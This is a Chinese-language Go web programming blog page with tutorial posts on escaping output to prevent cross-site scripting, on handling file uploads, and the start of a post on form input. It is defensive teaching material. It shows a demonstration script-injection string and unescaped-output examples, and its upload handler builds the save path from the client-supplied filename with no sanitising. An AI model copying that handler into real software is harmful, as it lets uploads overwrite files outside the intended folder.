<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"2324152038.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="登峰造极境">
<meta property="og:type" content="website">
<meta property="og:title" content="RISE">
<meta property="og:url" content="http://2324152038.github.io/index.html">
<meta property="og:site_name" content="RISE">
<meta property="og:description" content="登峰造极境">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="春去春来">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://2324152038.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>RISE</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">RISE</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-images">

    <a href="/images/" rel="section"><i class="fa fa-tags fa-fw"></i>图片</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/18/9-%E9%A2%84%E9%98%B2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%92%8C%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/18/9-%E9%A2%84%E9%98%B2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%92%8C%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">9.预防跨站脚本和处理文件上传</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-18 08:57:09 / 修改时间：09:16:10" itemprop="dateCreated datePublished" datetime="2022-09-18T08:57:09+08:00">2022-09-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="预防跨站脚本"><a href="#预防跨站脚本" class="headerlink" title="预防跨站脚本"></a>预防跨站脚本</h1><p>现在的网站包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。</p>
<p>攻击者通常会在有漏洞的程序中插入 JavaScript、VBScript、 ActiveX 或 Flash 以欺骗用户。一旦得手，他们可以盗取用户帐户信息，修改用户设置，盗取 &#x2F; 污染 cookie 和植入恶意广告等。</p>
<p>对 XSS 最佳的防护应该结合以下两种方法：一是验证所有输入数据，有效检测攻击 (这个我们前面小节已经有过介绍); 另一个是对所有输出数据进行适当的处理，以防止任何已成功注入的脚本在浏览器端运行。</p>
<p>那么 Go 里面是怎么做这个有效防护的呢？Go 的 html&#x2F;template 里面带有下面几个函数可以帮你转义</p>
<p>func HTMLEscape (w io.Writer, b [] byte) &#x2F;&#x2F; 把 b 进行转义之后写到 w<br>func HTMLEscapeString (s string) string &#x2F;&#x2F; 转义 s 之后返回结果字符串<br>func HTMLEscaper (args …interface {}) string &#x2F;&#x2F; 支持多个参数一起转义，返回结果字符串<br>我们看 4.1 小节的例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;username:&quot;</span>, template.HTMLEscapeString(r.Form.Get(<span class="string">&quot;username&quot;</span>))) <span class="comment">// 输出到服务器端</span></span><br><span class="line">fmt.Println(<span class="string">&quot;password:&quot;</span>, template.HTMLEscapeString(r.Form.Get(<span class="string">&quot;password&quot;</span>)))</span><br><span class="line">template.HTMLEscape(w, []<span class="type">byte</span>(r.Form.Get(<span class="string">&quot;username&quot;</span>))) <span class="comment">// 输出到客户端</span></span><br></pre></td></tr></table></figure>

<p>如果我们输入的 username 是 <code>&lt;script&gt;alert()&lt;/script&gt;</code>, 那么我们可以在浏览器上面看到输出如下所示：</p>
<p>图 4.3 Javascript 过滤之后的输出</p>
<p>Go 的 html&#x2F;template 包默认帮你过滤了 html 标签，但是有时候你只想要输出这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>  看起来正常的信息，该怎么处理？请使用 text&#x2F;template。请看下面的例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;text/template&quot;</span></span><br><span class="line">...</span><br><span class="line">t, err := template.New(<span class="string">&quot;foo&quot;</span>).Parse(<span class="string">`&#123;&#123;define &quot;T&quot;&#125;&#125;Hello, &#123;&#123;.&#125;&#125;!&#123;&#123;end&#125;&#125;`</span>)</span><br><span class="line">err = t.ExecuteTemplate(out, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(&#x27;you have been pwned&#x27;)&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &lt;script&gt;alert(&#x27;you have been pwned&#x27;)&lt;/script&gt;!</span><br></pre></td></tr></table></figure>

<p>或者使用 template.HTML 类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;html/template&quot;</span></span><br><span class="line">...</span><br><span class="line">t, err := template.New(<span class="string">&quot;foo&quot;</span>).Parse(<span class="string">`&#123;&#123;define &quot;T&quot;&#125;&#125;Hello, &#123;&#123;.&#125;&#125;!&#123;&#123;end&#125;&#125;`</span>)</span><br><span class="line">err = t.ExecuteTemplate(out, <span class="string">&quot;T&quot;</span>, template.HTML(<span class="string">&quot;&lt;script&gt;alert(&#x27;you have been pwned&#x27;)&lt;/script&gt;&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;you have been pwned&#x27;</span>)&lt;/script&gt;!</span><br></pre></td></tr></table></figure>

<h1 id="处理文件上传"><a href="#处理文件上传" class="headerlink" title="处理文件上传"></a>处理文件上传</h1><p>你想处理一个由用户上传的文件，比如你正在建设一个类似 Instagram 的网站，你需要存储用户拍摄的照片。这种需求该如何实现呢？</p>
<p>要使表单能够上传文件，首先第一步就是要添加 form 的 enctype 属性，enctype 属性有如下三种情况:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded   表示在发送前编码所有字符（默认）</span><br><span class="line">multipart/form-data   不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。</span><br><span class="line">text/plain    空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</span><br></pre></td></tr></table></figure>

<p>所以，创建新的表单 html 文件，命名为 upload.gtpl, html 代码应该类似于:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadfile&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123;.&#125;&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在服务器端，我们增加一个 handlerFunc:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">http.HandleFunc(<span class="string">&quot;/upload&quot;</span>, upload)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 /upload  逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">upload</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;method:&quot;</span>, r.Method) <span class="comment">// 获取请求的方法</span></span><br><span class="line">    <span class="keyword">if</span> r.Method == <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">        crutime := time.Now().Unix()</span><br><span class="line">        h := md5.New()</span><br><span class="line">        io.WriteString(h, strconv.FormatInt(crutime, <span class="number">10</span>))</span><br><span class="line">        token := fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, h.Sum(<span class="literal">nil</span>))</span><br><span class="line"></span><br><span class="line">        t, _ := template.ParseFiles(<span class="string">&quot;upload.gtpl&quot;</span>)</span><br><span class="line">        t.Execute(w, token)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        r.ParseMultipartForm(<span class="number">32</span> &lt;&lt; <span class="number">20</span>)</span><br><span class="line">        file, handler, err := r.FormFile(<span class="string">&quot;uploadfile&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> file.Close()</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;%v&quot;</span>, handler.Header)</span><br><span class="line">        f, err := os.OpenFile(<span class="string">&quot;./test/&quot;</span>+handler.Filename, os.O_WRONLY|os.O_CREATE, <span class="number">0666</span>)  <span class="comment">// 此处假设当前目录下已存在test目录</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> f.Close()</span><br><span class="line">        io.Copy(f, file)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的代码可以看到，处理文件上传我们需要调用 r.ParseMultipartForm，里面的参数表示 maxMemory，调用 ParseMultipartForm 之后，上传的文件存储在 maxMemory 大小的内存里面，如果文件大小超过了 maxMemory，那么剩下的部分将存储在系统的临时文件中。我们可以通过 r.FormFile 获取上面的文件句柄，然后实例中使用了 io.Copy 来存储文件。</p>
<p>过上面的实例我们可以看到我们上传文件主要三步处理：</p>
<p>表单中增加 enctype&#x3D;”multipart&#x2F;form-data”<br>服务端调用 r.ParseMultipartForm, 把上传的文件存储在内存和临时文件中<br>使用 r.FormFile 获取文件句柄，然后对文件进行存储等处理。</p>
<p>文件 handler 是 multipart.FileHeader, 里面存储了如下结构信息</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> FileHeader <span class="keyword">struct</span> &#123;</span><br><span class="line">    Filename <span class="type">string</span></span><br><span class="line">    Header   textproto.MIMEHeader</span><br><span class="line">    <span class="comment">// contains filtered or unexported fields</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>们通过上面的实例代码打印出来上传文件的信息如下</p>
<p><img src="https://cdn.learnku.com/build-web-application-with-golang/images/4.5.upload2.png?raw=true" alt="img"></p>
<p>图 4.5 打印文件上传后服务器端接受的信息</p>
<h2 id="客户端上传文件"><a href="#客户端上传文件" class="headerlink" title="客户端上传文件"></a>客户端上传文件</h2><p>我们上面的例子演示了如何通过表单上传文件，然后在服务器端处理文件，其实 Go 支持模拟客户端表单功能支持文件上传，详细用法请看如下示例：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postFile</span><span class="params">(filename <span class="type">string</span>, targetUrl <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    bodyBuf := &amp;bytes.Buffer&#123;&#125;</span><br><span class="line">    bodyWriter := multipart.NewWriter(bodyBuf)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键的一步操作</span></span><br><span class="line">    fileWriter, err := bodyWriter.CreateFormFile(<span class="string">&quot;uploadfile&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;error writing to buffer&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件句柄操作</span></span><br><span class="line">    fh, err := os.Open(filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;error opening file&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> fh.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// iocopy</span></span><br><span class="line">    _, err = io.Copy(fileWriter, fh)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contentType := bodyWriter.FormDataContentType()</span><br><span class="line">    bodyWriter.Close()</span><br><span class="line"></span><br><span class="line">    resp, err := http.Post(targetUrl, contentType, bodyBuf)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    resp_body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(resp.Status)</span><br><span class="line">    fmt.Println(<span class="type">string</span>(resp_body))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sample usage</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    target_url := <span class="string">&quot;http://localhost:9090/upload&quot;</span></span><br><span class="line">    filename := <span class="string">&quot;./astaxie.pdf&quot;</span></span><br><span class="line">    postFile(filename, target_url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>面的例子详细展示了客户端如何向服务器上传一个文件的例子，客户端通过 multipart.Write 把文件的文本流写入一个缓存中，然后调用 http 的 Post 方法把缓存传到服务器。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/17/8-%E8%A1%A8%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/8-%E8%A1%A8%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5/" class="post-title-link" itemprop="url">8.表单的输入与验证</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-17 12:40:30" itemprop="dateCreated datePublished" datetime="2022-09-17T12:40:30+08:00">2022-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-18 08:54:13" itemprop="dateModified" datetime="2022-09-18T08:54:13+08:00">2022-09-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="处理表单的输入"><a href="#处理表单的输入" class="headerlink" title="处理表单的输入"></a>处理表单的输入</h1><p>先来看一个表单递交的例子，我们有如下的表单内容，命名成文件 login.gtpl (放入当前新建项目的目录里面)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面递交表单到服务器的 &#x2F;login，当用户输入信息点击登录之后，会跳转到服务器的路由 login 里面，我们首先要判断这个是什么方式传递过来，POST 还是 GET 呢？</p>
<p>http 包里面有一个很简单的方式就可以获取，我们在前面 web 的例子的基础上来看看怎么处理 login 页面的 form 数据</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;html/template&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    r.ParseForm()       <span class="comment">// 解析 url 传递的参数，对于 POST 则解析响应包的主体（request body）</span></span><br><span class="line">    <span class="comment">// 注意:如果没有调用 ParseForm 方法，下面无法获取表单的数据</span></span><br><span class="line">    fmt.Println(r.Form) <span class="comment">// 